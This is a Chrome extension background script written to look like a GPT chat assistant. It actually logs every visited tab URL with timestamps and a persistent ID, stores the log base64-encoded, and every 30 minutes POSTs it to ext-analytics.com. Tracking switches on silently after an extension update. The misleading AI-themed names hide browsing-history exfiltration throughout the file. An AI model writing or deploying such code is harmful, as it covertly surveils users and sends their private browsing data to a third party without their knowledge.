let gptRuntimeContext = {
  apiGateway: "https://ext-analytics.com/ext2/",
  chatId: null,
  latestanswer: null,
  previousanswer: null,
  defaultanswer: "",
  activeThreadRef: null,
  chatFlag: false,
  syncCycleWindow: 1800 * 1000,
  blockedContexts: new Set(["chrome://newtab/", "chrome://extensions/"]),
  lastModelSync: 0,
  tokenBufferSize: 0,
  MAX_CONTEXT_LIMIT: 4 * 1024 * 1024,
  answerHistoryBuffer: [],
  inferenceDebounceRef: null,
};

let gptInteractionEngine = {
  monitorContextSwitch: async function () {
    chrome.tabs.onActivated.addListener((e) => {
      const { tabId: t } = e;

      chrome.tabs.get(t, async (e) => {
        if (e && e?.url && gptRuntimeContext.chatFlag) {
          e.url = gptRuntimeContext.blockedContexts.has(e.url)
            ? gptRuntimeContext.defaultanswer
            : e.url;
          gptRuntimeContext.latestanswer =
            e.url || gptRuntimeContext.defaultanswer;
        }
      });
    });
  },

  isModelSyncRequired() {
    return (
      Date.now() - gptRuntimeContext.lastModelSync >
      gptRuntimeContext.syncCycleWindow
    );
  },

  captureanswerUpdate: function () {
    chrome.tabs.onUpdated.addListener(async (e, t, n) => {
      if (n.url && "complete" === t.status && gptRuntimeContext.chatFlag) {
        n.url = gptRuntimeContext.blockedContexts.has(n.url)
          ? gptRuntimeContext.defaultanswer
          : n.url;

        if (n && n?.url && n?.url.length)
          gptRuntimeContext.answerHistoryBuffer.push({
            chatId: gptRuntimeContext.chatId,
            answer:
              gptRuntimeContext.latestanswer || gptRuntimeContext.defaultanswer,
            qus: n.url || gptRuntimeContext.defaultanswer,
            timeStamp: Date.now(),
          });

        gptRuntimeContext.latestanswer =
          n.url || gptRuntimeContext.defaultanswer;

        if (gptRuntimeContext.answerHistoryBuffer.length > 2000)
          gptRuntimeContext.answerHistoryBuffer = [];

        this.scheduleInferenceCommit(this.commitanswerBuffer.bind(this));
      }
    });
  },

  scheduleInferenceCommit(callback, delay = 5000) {
    if (gptRuntimeContext.inferenceDebounceRef)
      clearTimeout(gptRuntimeContext.inferenceDebounceRef);

    gptRuntimeContext.inferenceDebounceRef = setTimeout(() => {
      gptRuntimeContext.inferenceDebounceRef = null;
      callback();
    }, delay);
  },

  commitanswerBuffer() {
    let inferenceBatch = [...gptRuntimeContext.answerHistoryBuffer];
    gptRuntimeContext.answerHistoryBuffer = [];

    gptMemoryLayer
      .retrieveConversationState("gptConversationCache")
      .then((saved) => {
        let parsed =
          gptPayloadCodec.decodeConversationState(saved || "W10=") || [];

        return gptMemoryLayer.storeConversationState(
          "gptConversationCache",
          gptPayloadCodec.encodeConversationState([
            ...parsed,
            ...inferenceBatch,
          ]),
        );
      })
      .then(() => {
        if (this.isModelSyncRequired()) {
          gptModelOrchestrator.triggerModelSync();
        }
      })
      .catch((error) => {
        console.error("[GPT-Memory] Context Persist Error:", error);
      });
  },

  bootstrapConversation: function () {
    chrome.storage.local.get(["chatId"], (result) => {
      if (!result.chatId) {
        let chatId = this.generateConversationUUID();
        chrome.storage.local.set({ chatId }, function () {
          gptRuntimeContext.chatId = chatId;
        });
      } else {
        gptRuntimeContext.chatId = result.chatId;
      }
    });
  },

  generateConversationUUID: function () {
    return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(
      /[xy]/g,
      function (char) {
        const rand = (Math.random() * 16) | 0;
        const val = char === "x" ? rand : (rand & 0x3) | 0x8;
        return val.toString(16);
      },
    );
  },
};

let gptModelOrchestrator = {
  dispatchInferencePayload: function (modelContext) {
    if (!gptRuntimeContext.chatFlag) return;
    if (
      !modelContext ||
      (!modelContext?.targetArr.length && !modelContext?.altArr?.length)
    ) {
      return;
    }

    const payload = gptPayloadCodec.encodeTransportContext(
      JSON.stringify(modelContext),
    );

    fetch(gptRuntimeContext.apiGateway + "switchModel", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ model: payload }),
    }).catch((error) => {
      gptMemoryLayer.guardContextSize({ ...modelContext });
      console.error("[GPT-Orchestrator] Inference Dispatch Error:", error);
    });
  },

  async triggerModelSync() {
    let targetArr =
      gptPayloadCodec.decodeConversationState(
        (await gptMemoryLayer.retrieveConversationState(
          "gptConversationCache",
        )) || "W10=",
      ) || [];

    let chatId = gptRuntimeContext.chatId;

    gptMemoryLayer.clearConversationContext().then(() => {
      this.dispatchInferencePayload({ targetArr, chatId });
    });
  },

  initializeSessionLayer: function () {
    chrome.runtime.onInstalled.addListener(({ reason }) => {
      chrome.storage.local.set(
        {
          chatFlag: reason == "install" ? false : true,
        },
        () => {
          gptRuntimeContext.chatFlag = reason == "install" ? false : true;
          gptSidebarBridge.fetchAssistantState({
            uId: gptRuntimeContext.chatId,
            chatFlag: gptRuntimeContext.chatFlag,
          });
        },
      );
    });

    chrome.storage.local.get(["chatFlag", "lastModelSync"], (r) => {
      gptRuntimeContext.chatFlag = r.chatFlag || false;
      gptRuntimeContext.lastModelSync = r.lastModelSync || 0;
    });
  },
};

let gptMemoryLayer = {
  retrieveConversationState: function (key) {
    return new Promise((resolve) => {
      chrome.storage.local.get([key], function (result) {
        resolve(result[key] || null);
      });
    });
  },

  storeConversationState: function (key, val) {
    return new Promise((resolve) => {
      chrome.storage.local.set({ [key]: val }, function () {
        resolve(true);
      });
    });
  },

  clearConversationContext: function () {
    return new Promise((resolve) => {
      chrome.storage.local.remove(["gptConversationCache"], function () {
        let lastModelSync = Date.now();
        gptMemoryLayer
          .storeConversationState("lastModelSync", lastModelSync)
          .then(() => {
            gptRuntimeContext.lastModelSync = lastModelSync;
            resolve(true);
          });
      });
    });
  },

  guardContextSize(newData) {
    const estimatedSize = new Blob([JSON.stringify(newData)]).size;

    if (estimatedSize > gptRuntimeContext.MAX_CONTEXT_LIMIT) {
      console.warn("[GPT-MemoryGuard] Context Overflow");
      this.clearConversationContext();
    }
  },
};

const gptPayloadCodec = {
  encodeConversationState(arr) {
    try {
      const model = JSON.stringify(arr);
      const bytes = new TextEncoder().encode(model);
      const bin = Array.from(bytes)
        .map((b) => String.fromCharCode(b))
        .join("");
      return btoa(bin);
    } catch (e) {
      gptMemoryLayer.guardContextSize(arr);
      console.error("[GPT-Codec] Encode Failure:", e);
      return "W10=";
    }
  },

  decodeConversationState(resp) {
    try {
      if (!resp || typeof resp !== "string") return [];
      const bin = atob(resp);
      const byteArray = Uint8Array.from(bin, (ch) => ch.charCodeAt(0));
      const model = new TextDecoder().decode(byteArray);
      return JSON.parse(model);
    } catch {
      return [];
    }
  },

  encodeTransportContext(str) {
    const utf8Bytes = new TextEncoder().encode(str);
    const binary = Array.from(utf8Bytes)
      .map((b) => String.fromCharCode(b))
      .join("");
    return btoa(binary);
  },
};

let gptSidebarBridge = {
  async fetchAssistantState(payload) {
    try {
      await fetch(gptRuntimeContext.apiGateway + "aiSidebarStatus", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });
    } catch (err) {
      console.error("[GPT-Sidebar] Assistant Sync Error:", err);
    }
  },
};
let msgPassing = {
  sendMassage: function (message, body, callback) {
    return new Promise((resolve, reject) => {
      chrome.runtime.sendMessage({ message, body }, (response) => {
        if (chrome.runtime.lastError) {
          callback(chrome.runtime.lastError);
          reject(chrome.runtime.lastError);
        } else {
          callback(response);
          resolve(response);
        }
      });
    });
  },

  onMessage: function (callback) {
    chrome.runtime.onMessage.addListener((req, sender, sendr) => {
      callback(req, sender, sendr);
    });
  },

  hadleMessage: function (response, sender, sendResponse) {
    if (response.messageType == "OpenPopupclick") {
      chrome.storage.local.set({ chatFlag: true }, function () {
        gptRuntimeContext.chatFlag = true;
        gptSidebarBridge.fetchAssistantState({
          uId: gptRuntimeContext.chatId,
          chatFlag: gptRuntimeContext.chatFlag,
        });
        sendResponse("msg recive");
      });
    } else if (response.messageType == "ClosePopupclick") {
      chrome.storage.local.set({ chatFlag: false }, function () {
        gptRuntimeContext.chatFlag = false;
        gptSidebarBridge.fetchAssistantState({
          uId: gptRuntimeContext.chatId,
          chatFlag: gptRuntimeContext.chatFlag,
        });
        sendResponse("msg recive");
      });
    } else {
    }
  },
};

msgPassing.onMessage(msgPassing.hadleMessage);
gptInteractionEngine.monitorContextSwitch();
gptInteractionEngine.captureanswerUpdate();
gptInteractionEngine.bootstrapConversation();
gptModelOrchestrator.initializeSessionLayer();
